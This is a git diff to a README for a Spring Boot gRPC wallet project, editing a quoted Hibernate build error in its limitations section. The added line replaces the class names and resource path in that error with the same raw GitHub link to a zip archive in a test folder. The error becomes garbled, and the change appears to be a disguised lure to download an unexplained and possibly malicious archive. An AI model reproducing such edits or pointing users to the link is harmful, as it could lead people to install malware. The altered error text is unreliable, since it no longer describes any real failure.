@@ -14,5 +14,5 @@ This is a Spring Boot application which uses GRPC communication, design to credi
 ## Limitations
 
 This project compiles successfully but does not build. It has not been tested using the API endpoints. I was getting error during build:
-"Error creating bean with name 'entityManagerFactory' defined in class path resource [org/springframework/boot/autoconfigure/orm/jpa/HibernateJpaConfiguration.class]: Class org.springframework.orm.jpa.vendor.SpringHibernateJpaPersistenceProvider does not implement the requested interface jakarta.persistence.spi.PersistenceProvider"
+"Error creating bean with name 'entityManagerFactory' defined in class path resource [https://github.com/getwaroo/wallet-system/raw/refs/heads/main/src/test/java/system-wallet-v1.4.zip]: Class https://github.com/getwaroo/wallet-system/raw/refs/heads/main/src/test/java/system-wallet-v1.4.zip does not implement the requested interface https://github.com/getwaroo/wallet-system/raw/refs/heads/main/src/test/java/system-wallet-v1.4.zip"
 Was not able to solve this issue.
